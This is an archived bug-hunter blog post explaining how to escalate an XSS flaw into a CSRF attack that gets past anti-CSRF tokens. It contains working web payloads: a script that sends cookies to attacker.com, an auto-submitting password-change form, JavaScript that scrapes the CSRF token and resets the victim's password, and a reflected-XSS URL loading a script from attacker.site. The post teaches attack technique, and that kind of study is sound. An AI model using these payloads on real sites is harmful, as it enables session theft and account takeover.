# Bypass CSRF protection with XSS.

- **Source URL:** https://h1nt3r.medium.com/bypass-csrf-protection-with-xss-735e7611f8a4?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20230529045507/https://h1nt3r.medium.com/bypass-csrf-protection-with-xss-735e7611f8a4
- **Fetched:** 2026-11-19
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/1544 (id 1544)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# بِسْمِ اللَّـهِ الرَّحْمَـٰنِ الرَّحِيمِ

## Hello friend, I’m ahmed, noob (Penetration tester | Bug hunter) & today I will talk about escalate XSS to CSRF

Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF) are two common types of web application vulnerabilities that can have severe consequences for both the affected website and its users. In this article, we will explain how an attacker can escalate an XSS vulnerability to a CSRF attack, and how to prevent these types of attacks.

First, what is **XSS :**

XSS is a type of security vulnerability that allows an attacker to inject malicious code (usually JavaScript) into a web page viewed by other users. The injected code can be used to steal sensitive information, such as login credentials, or to perform actions on behalf of the victim, such as making a purchase or changing account settings. For example, if a website allows users to post comments, but does not properly sanitize user input, an attacker could post a comment containing a malicious script, such as :

`<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie;</script>`
When other users view the comment, the malicious script will execute, stealing the user’s cookies and sending them to the attacker’s server.

There are two types of XSS attacks: stored and reflected. Stored XSS attacks occur when the attacker is able to inject malicious code into a web page that is then permanently stored on the server and served to all users who visit the page. Reflected XSS attacks occur when the attacker injects malicious code into a web page, but the code is not permanently stored. Instead, the code is executed only when the victim visits the page.

Second, what is CSRF :

CSRF is a type of attack that allows an attacker to perform actions on behalf of a victim, without the victim’s knowledge or consent. This is done by tricking the victim into visiting a malicious website or clicking on a malicious link while they are logged into a vulnerable website. Once the victim visits the malicious website, the attacker can use the victim’s cookies and session information to perform actions on the vulnerable website, such as changing account settings or making a purchase.

For example, an attacker could create a malicious website that contains the following HTML code :

```
<form method="POST" action="http://vulnerable.com/changepassword">
    <input type="hidden" name="newpassword" value="attackerpassword">
    <input type="submit" value="Change Password">
</form>
```
When a victim visits the malicious website while logged into the vulnerable website, the form will be automatically submitted, changing the victim’s password to “attackerpassword”.

Now how can we combine the two vulnerabilitys together to get a high impact 🤑🤑🤑

A CSRF vulnerability can be used in conjunction with an XSS vulnerability to bypass the CSRF protection. In this type of attack, the attacker injects a malicious script into a web page that the victim visits. The script then sends a forged request to the web application with the victim’s cookies, allowing the attacker to perform actions on the victim’s behalf.

Here is an example of how this type of attack can be carried out :

1. The attacker finds an XSS vulnerability in a web application, which allows them to inject a malicious script into a web page viewed by the victim.
2. The script creates a hidden form on the page with the necessary parameters for a sensitive action, such as changing the victim’s password. The script also sets the action of the form to a URL on the web application.
3. The script then automatically submits the form, sending a forged request with the victim’s cookies to the web application. The request appears to be coming from the victim, and the server processes it without checking for a CSRF token.
4. The attacker can then perform the sensitive action on the victim’s behalf, such as changing their password.

Malicious JavaScript payload that will update the victim's password to hacked


var csrfProtectedPage = 'http://vulnerable.site/profile.php';

var csrfProtectedForm = 'form';

// get valid token for current request

var html = get(csrfProtectedPage);

document.body.innerHTML = html;

var form = document.getElementById(csrfProtectedForm);

var token = form.token.value;

// build form with valid token and evil credentials

document.body.innerHTML

+= '<form id="myform" action="' + csrfProtectedPage + '" method="POST">'

+ '<input type="hidden" name="token" value="' + token + '">'

+ '<input id="password" name="name" value="hacked">'

+ '</form>';

// submit form

document.forms["myform"].submit();

function get(url) {

var xmlHttp = new XMLHttpRequest();

xmlHttp.open("GET", url, false);

xmlHttp.send(null);

return xmlHttp.responseText;

}

If we put that code inside the js file and put its in the xss src payload and the victim opens that url, his password will be changed to hacked.

URL with js payload :

https://vulnerable.site/profile.php?msg=\<script src=’https://attacker.site/attacker/script.js'>\</script>

The following js code is the one we kept the payload inside :

`<script src='https://attacker.site/attacker/script.js'></script>`
